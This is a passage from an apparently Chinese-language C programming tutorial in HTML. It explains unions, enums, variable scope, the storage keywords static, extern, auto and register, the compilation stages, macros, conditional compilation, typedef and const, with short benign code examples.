    printf(&quot;p1.name = %s\n&quot;, p1.name); // lnj
    test(p1);
    printf(&quot;p1.name = %s\n&quot;, p1.name); // lnj
    return 0;
&#125;
void test(struct Person per)&#123;
    per.name = &quot;zs&quot;;
&#125;</code></pre>
<h2 id="共用体">共用体</h2>
<ul>
<li>和结构体不同的是, 结构体的每个成员都是占用一块独立的存储空间, 而共用体所有的成员都占用同一块存储空间</li>
<li>和结构体一样, 共用体在使用之前必须先定义共用体类型, 再定义共用体变量</li>
<li>定义共用体类型格式:</li>
</ul>
<pre><code class="hljs plaintext">union 共用体名&#123;
    数据类型 属性名称;
    数据类型 属性名称;
    ...   ....
&#125;;</code></pre>
<ul>
<li>定义共用体类型变量格式:</li>
</ul>
<pre><code class="hljs plaintext">union 共用体名 共用体变量名称;</code></pre>
<ul>
<li>特点: 由于所有属性共享同一块内存空间, 所以只要其中一个属性发生了改变, 其它的属性都会受到影响</li>
<li>示例:</li>
</ul>
<pre><code class="hljs plaintext">union Test&#123;
    int age;
    char ch;
&#125;;
union Test t;
printf(&quot;sizeof(p) = %i\n&quot;, sizeof(t));

t.age = 33;
printf(&quot;t.age = %i\n&quot;, t.age); // 33
t.ch = &#x27;a&#x27;;
printf(&quot;t.ch = %c\n&quot;, t.ch); // a
printf(&quot;t.age = %i\n&quot;, t.age); // 97</code></pre>
<ul>
<li>共用体的应用场景
<ul>
<li>（1）通信中的数据包会用到共用体，因为不知道对方会发送什么样的数据包过来，用共用体的话就简单了，定义几种格式的包，收到包之后就可以根据包的格式取出数据。</li>
<li>（2）节约内存。如果有2个很长的数据结构，但不会同时使用，比如一个表示老师，一个表示学生，要统计老师和学生的情况，用结构体就比较浪费内存，这时就可以考虑用共用体来设计。<br>
+（3）某些应用需要大量的临时变量，这些变量类型不同，而且会随时更换。而你的堆栈空间有限，不能同时分配那么多临时变量。这时可以使用共用体让这些变量共享同一个内存空间，这些临时变量不用长期保存，用完即丢，和寄存器差不多，不用维护。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="枚举">枚举</h2>
<ul>
<li>
<p>什么是枚举类型?</p>
<ul>
<li>在实际问题中,有些变量的取值被限定在一个有限的范围内。例如,一个星期内只有七天,一年只有十二个月,一个班每周有六门课程等等。如果把这些量说明为整型,字符型或其它类型 显然是不妥当的。</li>
<li>C语言提供了一种称为“枚举”的类型。在“枚举”类型的定义中列举出所有可能的取值, 被说明为该“枚举”类型的变量取值不能超过定义的范围。</li>
<li>该说明的是,枚举类型是一种基本数据类型,而不是一种构造类型,因为它不能再分解为任何基本类型。<br>
<img src="https://img-blog.csdnimg.cn/img_convert/fd45f0d1a459623bf0aaacc2b539d733.png" alt="img"></li>
</ul>
</li>
<li>
<p>枚举类型的定义</p>
<ul>
<li>格式:</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">enum　枚举名　&#123;
    枚举元素1,
    枚举元素2,
    ……
&#125;;</code></pre>
<ul>
<li>
<ul>
<li>示例:</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">// 表示一年四季
enum Season &#123;
    Spring,
    Summer,
    Autumn,
    Winter
&#125;;</code></pre>
<ul>
<li>枚举变量
<ul>
<li>先定义枚举类型，再定义枚举变量</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">enum Season &#123;
    Spring,
    Summer,
    Autumn,
    Winter
&#125;;
enum Season s;</code></pre>
<ul>
<li>
<ul>
<li>定义枚举类型的同时定义枚举变量</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">enum Season &#123;
    Spring,
    Summer,
    Autumn,
    Winter
&#125; s;</code></pre>
<ul>
<li>省略枚举名称，直接定义枚举变量</li>
</ul>
<pre><code class="hljs plaintext">enum &#123;
    Spring,
    Summer,
    Autumn,
    Winter
&#125; s;</code></pre>
<ul>
<li>枚举类型变量的赋值和使用</li>
</ul>
<pre><code class="hljs plaintext">enum Season &#123;
    Spring,
    Summer,
    Autumn,
    Winter
&#125; s;
s = Spring; // 等价于 s = 0;
s = 3; // 等价于 s = winter;
printf(&quot;%d&quot;, s);</code></pre>
<ul>
<li>枚举使用的注意
<ul>
<li>C语言编译器会将枚举元素(spring、summer等)作为整型常量处理，称为枚举常量。</li>
<li>枚举元素的值取决于定义时各枚举元素排列的先后顺序。默认情况下，第一个枚举元素的值为0，第二个为1，依次顺序加1。</li>
<li>也可以在定义枚举类型时改变枚举元素的值</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">enum Season &#123;
    Spring,
    Summer,
    Autumn,
    Winter
&#125;;
// 也就是说spring的值为0，summer的值为1，autumn的值为2，winter的值为3</code></pre>
<pre><code class="hljs plaintext">enum Season &#123;
    Spring = 9,
    Summer,
    Autumn,
    Winter
&#125;;
// 也就是说spring的值为9，summer的值为10，autumn的值为11，winter的值为12</code></pre>
<h2 id="全局变量和局部变量">全局变量和局部变量</h2>
<ul>
<li>变量作用域基本概念
<ul>
<li>变量作用域：变量的可用范围</li>
<li>按照作用域的不同，变量可以分为：局部变量和全局变量</li>
</ul>
</li>
<li>局部变量
<ul>
<li>定义在函数内部的变量以及函数的形参, 我们称为局部变量</li>
<li>作用域：从定义的那一行开始, 直到遇到}结束或者遇到return为止</li>
<li>生命周期: 从程序运行到定义哪一行开始分配存储空间到程序离开该变量所在的作用域</li>
<li>存储位置: 局部变量会存储在内存的栈区中</li>
<li>特点：
<ul>
<li>相同作用域内不可以定义同名变量</li>
<li>不同作用范围可以定义同名变量，内部作用域的变量会覆盖外部作用域的变量</li>
</ul>
</li>
</ul>
</li>
<li>全局变量
<ul>
<li>定义在函数外面的变量称为全局变量</li>
<li>作用域范围：从定义哪行开始直到文件结尾</li>
<li>生命周期:程序一启动就会分配存储空间,直到程序结束</li>
<li>存储位置：静态存储区</li>
<li>特点: 多个同名的全局变量指向同一块存储空间</li>
</ul>
</li>
</ul>
<hr>
<h2 id="auto和register关键字">auto和register关键字</h2>
<ul>
<li>auto关键字(忘记)
<ul>
<li>只能修饰局部变量, 局部变量如果没有其它修饰符, 默认就是auto的</li>
<li>特点: 随用随开, 用完即销</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">auto int num; // 等价于 int num;</code></pre>
<ul>
<li>register关键字(忘记)
<ul>
<li>只能修饰局部变量, 原则上将内存中变量提升到CPU寄存器中存储, 这样访问速度会更快</li>
<li>但是由于CPU寄存器数量相当有限, 通常不同平台和编译器在优化阶段会自动转换为auto</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">register int num;</code></pre>
<h2 id="static关键字">static关键字</h2>
<ul>
<li>对局部变量的作用
<ul>
<li>延长局部变量的生命周期,从程序启动到程序退出,但是它并没有改变变量的作用域</li>
<li>定义变量的代码在整个程序运行期间仅仅会执行一次</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
void test();
int main()
&#123;
    test();
    test();
    test();

    return 0;
&#125;
void test()&#123;
    static int num = 0; // 局部变量
    num++; 
    // 如果不加static输出 1 1 1
    // 如果添加static输出 1 2 3
    printf(&quot;num = %i\n&quot;, num); 
&#125;</code></pre>
<ul>
<li>
<p><strong>对全局变量的作用</strong></p>
</li>
<li>
<p>全局变量分类：</p>
</li>
<li>
<p>内部变量:只能在本文件中访问的变量</p>
</li>
<li>
<p>外部变量:可以在其他文件中访问的变量,默认所有全局变量都是外部变量</p>
</li>
<li>
<p>默认情况下多个同名的全局变量共享一块空间, 这样会导致全局变量污染问题</p>
</li>
<li>
<p>如果想让某个全局变量只在某个文件中使用, 并且不和其他文件中同名全局变量共享同一块存储空间, 那么就可以使用static</p>
</li>
</ul>
<pre><code class="hljs plaintext">// A文件中的代码
int num; // 和B文件中的num共享
void test()&#123;
    printf(&quot;ds.c中的 num = %i\n&quot;, num);
&#125;</code></pre>
<pre><code class="hljs plaintext">// B文件中的代码
#include &lt;stdio.h&gt;
#include &quot;ds.h&quot;

int num; // 和A文件中的num共享
int main()
&#123;
    num = 666;
    test(); // test中输出666
    return 0;
&#125;</code></pre>
<pre><code class="hljs plaintext">// A文件中的代码
static int num; // 不和B文件中的num共享
void test()&#123;
    printf(&quot;ds.c中的 num = %i\n&quot;, num);
&#125;</code></pre>
<pre><code class="hljs plaintext">// B文件中的代码
#include &lt;stdio.h&gt;
#include &quot;ds.h&quot;

int num; // 不和A文件中的num共享
int main()
&#123;
    num = 666;
    test(); // test中输出0
    return 0;
&#125;</code></pre>
<h2 id="extern关键字">extern关键字</h2>
<ul>
<li>对局部变量的作用
<ul>
<li>extern不能用于局部变量</li>
<li>extern代表声明一个变量, 而不是定义一个变量, 变量只有定义才会开辟存储空间</li>
<li>所以如果是局部变量, 虽然提前声明有某个局部变量, 但是局部变量只有执行到才会分配存储空间</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    extern int num;
    num = 998; // 使用时并没有存储空间可用, 所以声明了也没用
    int num; // 这里才会开辟
    printf(&quot;num = %i\n&quot;, num);
    return 0;
&#125;</code></pre>
<ul>
<li>对全局变量的作用
<ul>
<li>声明一个全局变量, 代表告诉编译器我在其它地方定义了这个变量, 你可以放心使用</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    extern int num; // 声明我们有名称叫做num变量
    num = 998; // 使用时已经有对应的存储空间
    printf(&quot;num = %i\n&quot;, num);
    return 0;
&#125;
int num; // 全局变量, 程序启动就会分配存储空间</code></pre>
<h2 id="static与extern对函数的作用">static与extern对函数的作用</h2>
<ul>
<li>内部函数:只能在本文件中访问的函数</li>
<li>外部函数:可以在本文件中以及其他的文件中访问的函数</li>
<li>默认情况下所有的函数都是外部函数</li>
<li><strong>static 作用</strong>
<ul>
<li>声明一个内部函数</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">static int sum(int num1,int num2);</code></pre>
<ul>
<li>定义一个内部函数</li>
</ul>
<pre><code class="hljs plaintext">static int sum(int num1,int num2)
&#123;
  return num1 + num2;
&#125;</code></pre>
<ul>
<li>extern作用
<ul>
<li>声明一个外部函数</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">extern int sum(int num1,int num2);</code></pre>
<ul>
<li>
<ul>
<li>定义一个外部函数</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">extern int sum(int num1,int num2)
&#123;
  return num1 + num2;
&#125;</code></pre>
<blockquote>
<ul>
<li>注意点:</li>
<li>由于默认情况下所有的函数都是外部函数, 所以extern一般会省略</li>
<li>如果只有函数声明添加了static与extern, 而定义中没有添加static与extern, 那么无效</li>
</ul>
</blockquote>
<h2 id="qt-creator编译过程做了什么">Qt Creator编译过程做了什么?</h2>
<ul>
<li><img src="https://img-blog.csdnimg.cn/img_convert/4cf6a775135630e5e092ec5f7d977442.png" alt="img"></li>
<li>当我们按下运行按钮的时, 其实Qt Creator编译器做了5件事情
<ul>
<li>对源文件进行预处理, 生成预处理文件</li>
<li>对预处理文件进行编译, 生成汇编文件</li>
<li>对汇编文件进行编译, 生成二进制文件</li>
<li>对二进制文件进行链接, 生成可执行文件</li>
<li>运行可执行文件</li>
</ul>
</li>
</ul>
<hr>
<p>Qt Creator编译过程验证</p>
<ul>
<li><em><strong>1.编写代码, 保存源文件:</strong></em></li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
int main()&#123;
    printf(&quot;hello lnj\n&quot;);
    return 0;
&#125;</code></pre>
<p><em><strong>2.执行预处理编译</strong></em><br>
<img src="https://img-blog.csdnimg.cn/img_convert/85ce67f930603551cf3a9dfae277effd.png" alt="img"></p>
<ul>
<li>执行预处理编译后生成的文件<br>
<img src="https://img-blog.csdnimg.cn/img_convert/2e0edb5e01b80e1308d1651d6cee49cf.png" alt="img"></li>
</ul>
<p>打开预处理编译后生成的文件</p>
<ul>
<li>
<p>处理源文件中预处理相关的指令</p>
</li>
<li>
<p>处理源文件中多余注释等<br>
[外链图片转存中…(img-66BPT6H1-1648814825905)]</p>
</li>
<li>
<p><em><strong>3.执行汇编编译</strong></em><br>
<img src="https://img-blog.csdnimg.cn/img_convert/4fd0ccaf482c9cc55f01e765c417cf5e.png" alt="img"></p>
</li>
<li>
<p>执行汇编编译后生成的文件<br>
<img src="https://img-blog.csdnimg.cn/img_convert/a4c1f0baf9e24d3048dca3b46d6b466c.png" alt="img"></p>
</li>
<li>
<p>打开汇编编译后生成的文件<br>
[外链图片转存中…(img-UPPwxlFB-1648814825906)]</p>
</li>
</ul>
<hr>
<ul>
<li><em><strong>4.执行二进制编译</strong></em><br>
[外链图片转存中…(img-HeL6nIvy-1648814825906)]</li>
<li>执行二进制编译后生成的文件<br>
[外链图片转存中…(img-9OTp8b2w-1648814825906)]</li>
<li>打开二进制编译后生成的文件<br>
[外链图片转存中…(img-tmtp1Rr4-1648814825907)]</li>
</ul>
<hr>
<ul>
<li><strong>5.执行链接操作</strong>
<ul>
<li>将依赖的一些C语言函数库和我们编译好的二进制合并为一个文件<br>
[外链图片转存中…(img-kvA4ZJwX-1648814825907)]</li>
</ul>
</li>
<li>执行链接操作后生成的文件<br>
[外链图片转存中…(img-ECOKJpk2-1648814825907)]</li>
</ul>
<hr>
<ul>
<li><em><strong>6.运行链接后生成的文件</strong></em><br>
[外链图片转存中…(img-kxKrlE7c-1648814825908)]</li>
</ul>
<hr>
<h2 id="计算机是运算过程分析">计算机是运算过程分析</h2>
<ul>
<li>1.编写一个简单的加法运算</li>
<li>2.调试编写好的代码, 查看对应的汇编文件<br>
[外链图片转存中…(img-Ka0bxhr7-1648814825908)]<br>
[外链图片转存中…(img-K5uGITsh-1648814825908)]<br>
[外链图片转存中…(img-JXTyS91w-1648814825909)]</li>
<li>结论:
<ul>
<li>1.通过地址线找到对应地址的存储单元</li>
<li>2.通过控制线发送内存读取指令</li>
<li>3.通过数据线将内存中的值传输到CPU寄存器中</li>
<li>4.在CPU中完成计算操作</li>
<li>5.通过地址线找到对应地址的存储单元</li>
<li>6.通过控制线发送内存写入指令</li>
<li>7.通过数据线将计算结果传输到内存中</li>
</ul>
</li>
</ul>
<h2 id="预处理指令">预处理指令</h2>
<h2 id="预处理指令的概念">预处理指令的概念</h2>
<ul>
<li>C语言在对源程序进行编译之前，会先对一些特殊的预处理指令作解释(比如之前使用的#include文件包含指令)，产生一个新的源程序(这个过程称为编译预处理),之后再进行通常的编译</li>
<li>为了区分预处理指令和一般的C语句，所有预处理指令都以符号“#”开头，并且结尾不用分号</li>
<li>预处理指令可以出现在程序的任何位置，它的作用范围是从它出现的位置到文件尾。习惯上我们尽可能将预处理指令写在源程序开头，这种情况下，它的作用范围就是整个源程序文件</li>
<li>C语言提供了多种预处理功能,如宏定义、文件包含、条件编译等。合理地使用预处理功能编写的程序便于阅读、修改、移植和调试,也有利于模块化程序设计。</li>
</ul>
<hr>
<h2 id="宏定义">宏定义</h2>
<ul>
<li>
<p>被定义为“宏”的标识符称为“宏名”。在编译预处理时,对程序中所有出现的“宏名”,都用宏定义中的字符串去代换,这称为“宏代换”或“宏展开”。</p>
</li>
<li>
<p>宏定义是由源程序中的宏定义命令完成的。宏代换是由预处理程序自动完成的。在C语言中,“宏”分为有参数和无参数两种。<br>
##不带参数的宏定义</p>
</li>
<li>
<p>格式:</p>
<pre><code class="hljs plaintext">#define 标识符 字符串</code></pre>
<ul>
<li>其中的“#”表示这是一条预处理命令。凡是以“#”开头的均为预处理命令。“define”为宏定义命令。“标识符”为所定义的宏名。“字符串”可以是常数、表达式、格式串等。</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

  // 源程序中所有的宏名PI在编译预处理的时候都会被3.14所代替
  #define PI 3.14

 // 根据圆的半径计radius算周长
 float girth(float radius) &#123;
    return 2 * PI *radius;
&#125;

int main ()
 &#123;
    float g = girth(2);

    printf(&quot;周长为：%f&quot;, g);
    return 0;
&#125;</code></pre>
<ul>
<li><strong>注意点:</strong></li>
</ul>
<ol>
<li>宏名一般用大写字母，以便与变量名区别开来，但用小写也没有语法错误</li>
</ol>
<ul>
<li>2)对程序中用双引号扩起来的字符串内的字符，不进行宏的替换操作</li>
</ul>
<pre><code class="hljs plaintext">#define R 10
 int main ()
 &#123;
     char *s = &quot;Radio&quot;; // 在第1行定义了一个叫R的宏，但是第4行中&quot;Radio&quot;里面的&#x27;R&#x27;并不会被替换成10

     return 0;
 &#125;</code></pre>
<ul>
<li>3.在编译预处理用字符串替换宏名时，不作语法检查，只是简单的字符串替换。只有在编译的时候才对已经展开宏名的源程序进行语法检查</li>
</ul>
<pre><code class="hljs plaintext">#define I 100
 int main ()
 &#123;
     int i[3] = I;
     return 0;
 &#125;</code></pre>
<ul>
<li>4.宏名的有效范围是从定义位置到文件结束。如果需要终止宏定义的作用域，可以用#undef命令</li>
</ul>
<pre><code class="hljs plaintext">#define PI 3.14
int main ()
 &#123;
    printf(&quot;%f&quot;, PI);
    return 0;
&#125;
#undef PI
void test()
&#123;
    printf(&quot;%f&quot;, PI); // 不能使用
&#125;</code></pre>
<ul>
<li>5.定义一个宏时可以引用已经定义的宏名</li>
</ul>
<pre><code class="hljs plaintext">#define R  3.0
#define PI 3.14
#define L  2*PI*R
#define S  PI*R*R</code></pre>
<ul>
<li>6.可用宏定义表示数据类型,使书写方便</li>
</ul>
<pre><code class="hljs plaintext">#define String char *
int main(int argc, const char * argv[])
&#123;
     String str = &quot;This is a string!&quot;;
     return 0;
&#125;</code></pre>
<h2 id="带参数的宏定义">带参数的宏定义</h2>
<ul>
<li>C语言允许宏带有参数。在宏定义中的参数称为形式参数,在宏调用中的参数称为实际参数。对带参数的宏,在调用中,不仅要宏展开,而且要用实参去代换形参</li>
<li>格式: <code>#define 宏名(形参表) 字符串</code></li>
</ul>
<pre><code class="hljs plaintext">// 第1行中定义了一个带有2个参数的宏average，
 #define average(a, b) (a+b)/2

int main ()
  &#123;
  // 第4行其实会被替换成：int a = (10 + 4)/2;，
      int a = average(10, 4);
  // 输出结果为：7是不是感觉这个宏有点像函数呢？
      printf(&quot;平均值：%d&quot;, a);
     return 0;
 &#125;</code></pre>
<ul>
<li><strong>注意点:</strong></li>
<li>1)宏名和参数列表之间不能有空格，否则空格后面的所有字符串都作为替换的字符串.</li>
</ul>
<pre><code class="hljs plaintext">#define average (a, b) (a+b)/2

 int main ()
 &#123;
     int a = average(10, 4);
     return 0;
 &#125;
注意第1行的宏定义，宏名average跟(a, b)之间是有空格的，于是，第5行就变成了这样：
int a = (a, b) (a+b)/2(10, 4);
这个肯定是编译不通过的</code></pre>
<ul>
<li>2)带参数的宏在展开时，只作简单的字符和参数的替换，不进行任何计算操作。所以在定义宏时，一般用一个小括号括住字符串的参数。</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
  // 下面定义一个宏D(a)，作用是返回a的2倍数值：
  #define D(a) 2*a
  // 如果定义宏的时候不用小括号括住参数

  int main ()
  &#123;
  // 将被替换成int b = 2*3+4;，输出结果10，如果定义宏的时候用小括号括住参数，把上面的第3行改成：#define D(a) 2*(a)，注意右边的a是有括号的，第7行将被替换成int b = 2*(3+4);，输出结果14

     int b = D(3+4);
     printf(&quot;%d&quot;, b);
     return 0;
 &#125;</code></pre>
<ul>
<li>3)计算结果最好也用括号括起来</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
// 下面定义一个宏P(a)，作用是返回a的平方
#define Pow(a) (a) * (a) // 如果不用小括号括住计算结果

int main(int argc, const char * argv[])      &#123;
// 代码被替换为:int b = (10) * (10) / (2) * (2);
// 简化之后：int b = 10 * (10 / 2) * 2;，最后变量b为:100
      int b = Pow(10) / Pow(2);

      printf(&quot;%d&quot;, b);
      return 0;
&#125;</code></pre>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
// 计算结果用括号括起来
#define Pow(a) ( (a) * (a) )

int main(int argc, const char * argv[])      &#123;
// 代码被替换为:int b = ( (10) * (10) ) / ( (2) * (2) );
// 简化之后：int b = (10 * 10) / (2 *2);，最后输出结果：25
      int b = Pow(10) / Pow(2);

      printf(&quot;%d&quot;, b);
      return 0;
&#125;</code></pre>
<h2 id="条件编译">条件编译</h2>
<ul>
<li>在很多情况下，我们希望程序的其中一部分代码只有在满足一定条件时才进行编译，否则不参与编译(只有参与编译的代码最终才能被执行)，这就是条件编译。</li>
<li>为什么要使用条件编译
<ul>
<li>1)按不同的条件去编译不同的程序部分,因而产生不同的目标代码文件。有利于程序的移植和调试。</li>
<li>2)条件编译当然也可以用条件语句来实现。 但是用条件语句将会对整个源程序进行编译,生成 的目标代码程序很长,而采用条件编译,则根据条件只编译其中的程序段1或程序段2,生成的目 标程序较短。<br>
##if-#else 条件编译指令</li>
</ul>
</li>
<li>第一种格式:
<ul>
<li>它的功能是,如常量表达式的值为真(非0),则将code1 编译到程序中,否则对code2编译到程序中。</li>
<li>注意:
<ul>
<li>是将代码编译进可执行程序, 而不是执行代码</li>
<li>条件编译后面的条件表达式中不能识别变量,它里面只能识别常量和宏定义</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#if 常量表达式
    ..code1...
#else
    ..code2...
#endif</code></pre>
<pre><code class="hljs plaintext">#define SCORE 67
#if SCORE &gt; 90
    printf(&quot;优秀\n&quot;);
#else
    printf(&quot;不及格\n&quot;);
#endif</code></pre>
<ul>
<li>第二种格式:</li>
</ul>
<pre><code class="hljs plaintext">#if 条件1
  ...code1...
 #elif 条件2
  ...code2...
 #else
  ...code3...
 #endif</code></pre>
<pre><code class="hljs plaintext">#define SCORE 67
#if SCORE &gt; 90
    printf(&quot;优秀\n&quot;);
#elif SCORE &gt; 60
    printf(&quot;良好\n&quot;);
#else
    printf(&quot;不及格\n&quot;);
#endif</code></pre>
<h2 id="typedef关键字">typedef关键字</h2>
<ul>
<li>
<p>C语言不仅􏰀供了丰富的数据类型,而且还允许由用户自己定义类型说明符,也就是说允许由用户为数据类型取“别名”。</p>
</li>
<li>
<p>格式:</p>
<pre><code class="hljs plaintext">typedef 原类型名 新类型名;</code></pre>
<ul>
<li>其中原类型名中含有定义部分,新类型名一般用大写表示,以便于区别。</li>
<li>有时也可用宏定义来代替typedef的功能,但是宏定义是由预处理完成的,而typedef则是在编译 时完成的,后者更为灵活方便。<br>
##typedef使用</li>
</ul>
</li>
<li>
<p>基本数据类型</p>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> INTEGER
INTEGER a; <span class="hljs-comment">// 等价于 int a;</span></code></pre>
<ul>
<li>也可以在别名的基础上再起一个别名</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Integer;

<span class="hljs-keyword">typedef</span> Integer MyInteger;</code></pre>
<ul>
<li>用typedef定义数组、指针、结构等类型将带来很大的方便,不仅使程序书写简单而且使意义更为 明确,因而增强了可读性。</li>
<li>数组类型</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> NAME[<span class="hljs-number">20</span>]; <span class="hljs-comment">// 表示NAME是字符数组类型,数组长度为20。然后可用NAME 说明变量,</span>
NAME a; <span class="hljs-comment">// 等价于 char a[20];</span></code></pre>
<ul>
<li>结构体类型
<ul>
<li>第一种形式:</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span>&#123;</span>
    <span class="hljs-type">int</span> age;
    <span class="hljs-type">char</span> *name;
&#125;;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span> <span class="hljs-title">PersonType</span>;</span></code></pre>
<pre><code class="hljs plaintext">+ 第二种形式:</code></pre>
<pre><code class="hljs plaintext">typedef struct Person&#123;
    int age;
    char *name;
&#125; PersonType;</code></pre>
<pre><code class="hljs plaintext">+ 第三种形式:</code></pre>
<pre><code class="hljs plaintext">typedef struct &#123;
    int age;
    char *name;
&#125; PersonType;</code></pre>
<ul>
<li>枚举
<ul>
<li>第一种形式:</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Sex</span>&#123;</span>
    SexMan,
    SexWoman,
    SexOther
&#125;;
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Sex</span> <span class="hljs-title">SexType</span>;</span></code></pre>
<pre><code class="hljs plaintext">+ 第二种形式:</code></pre>
<pre><code class="hljs plaintext">typedef enum Sex&#123;
    SexMan,
    SexWoman,
    SexOther
&#125; SexType;</code></pre>
<pre><code class="hljs plaintext">+ 第三种形式:</code></pre>
<pre><code class="hljs plaintext">typedef enum&#123;
    SexMan,
    SexWoman,
    SexOther
&#125; SexType;</code></pre>
<ul>
<li>指针
<ul>
<li>typedef与指向结构体的指针</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 定义一个结构体并起别名</span>
 <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>
     <span class="hljs-type">float</span> x;
     <span class="hljs-type">float</span> y;
 &#125; Point;

<span class="hljs-comment">// 起别名</span>
<span class="hljs-keyword">typedef</span> Point *PP;</code></pre>
<ul>
<li>typedef与指向函数的指针</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 定义一个sum函数，计算a跟b的和</span>
  <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;
      <span class="hljs-type">int</span> c = a + b;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d + %d = %d&quot;</span>, a, b, c);
      <span class="hljs-keyword">return</span> c;
 &#125;
 <span class="hljs-keyword">typedef</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*MySum)</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span>;

<span class="hljs-comment">// 定义一个指向sum函数的指针变量p</span>
 MySum p = sum;</code></pre>
<h2 id="宏定义与函数以及typedef区别">宏定义与函数以及typedef区别</h2>
<ul>
<li>与函数的区别
<ul>
<li>从整个使用过程可以发现，带参数的宏定义，在源程序中出现的形式与函数很像。但是两者是有本质区别的：
<ul>
<li>1&gt; 宏定义不涉及存储空间的分配、参数类型匹配、参数传递、返回值问题</li>
<li>2&gt; 函数调用在程序运行时执行，而宏替换只在编译预处理阶段进行。所以带参数的宏比函数具有更高的执行效率</li>
</ul>
</li>
</ul>
</li>
<li>typedef和#define的区别
<ul>
<li>用宏定义表示数据类型和用typedef定义数据说明符的区别。
<ul>
<li>宏定义只是简单的字符串替换,￼是在预处理完成的</li>
<li>typedef是在编译时处理的,它不是作简单的代换,而是对类型说明符￼重新命名。被命名的标识符具有类型定义说明的功能</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">typedef char *String;
int main(int argc, const char * argv[])
&#123;
     String str = &quot;This is a string!&quot;;
     return 0;
&#125;


#define String char *
int main(int argc, const char * argv[])
&#123;
    String str = &quot;This is a string!&quot;;
     return 0;
&#125;</code></pre>
<pre><code class="hljs plaintext">typedef char *String1; // 给char *起了个别名String1
#define String2 char * // 定义了宏String2
int main(int argc, const char * argv[]) &#123;
        /*
        只有str1、str2、str3才是指向char类型的指针变量
        由于String1就是char *，所以上面的两行代码等于:
        char *str1;
        char *str2;
        */
      String1 str1, str2;
        /*
        宏定义只是简单替换, 所以相当于
        char *str3, str4;
        *号只对最近的一个有效, 所以相当于
        char *str3;
        char str4;
        */
      String2 str3, str4;
      return 0;
&#125;</code></pre>
<h2 id="const关键字">const关键字</h2>
<ul>
<li>const是一个类型修饰符
<ul>
<li>使用const修饰变量则可以让变量的值不能改变<br>
##const有什么主要的作用?</li>
</ul>
</li>
<li>(1)可以定义const常量,具有不可变性</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span> Max=<span class="hljs-number">100</span>;
<span class="hljs-type">int</span> Array[Max];</code></pre>
<ul>
<li>(2)便于进行类型检查,使编译器对处理内容有更多了解,消除了一些隐患。</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> i)</span> &#123; .........&#125;</code></pre>
<blockquote>
<ul>
<li>编译器就会知道i是一个常量,不允许修改;</li>
</ul>
</blockquote>
<ul>
<li>(3)可以避免意义模糊的数字出现,同样可以很方便地进行参数的调整和修改。 同宏定义一样,可以做到不变则已,一变都变!如(1)中,如果想修改Max的内容,只需要:const int Max=you want;即可!</li>
<li>(4)可以保护被修饰的东西,防止意外的修改,增强程序的健壮性。 还是上面的例子,如果在 函数体内修改了i,编译器就会报错;</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> i)</span> &#123; i=<span class="hljs-number">10</span>;<span class="hljs-comment">//error! &#125;</span></code></pre>
<ul>
<li>(5) 可以节省空间,避免不必要的内存分配。</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PI 3.14159 <span class="hljs-comment">//常量宏</span></span>
<span class="hljs-type">const</span> doulbe Pi=<span class="hljs-number">3.14159</span>; <span class="hljs-comment">//此时并未将Pi放入ROM中 ...... double i=Pi; //此时为Pi分配内存,以后不再分配!</span>
<span class="hljs-type">double</span> I=PI; <span class="hljs-comment">//编译期间进行宏替换,分配内存</span>
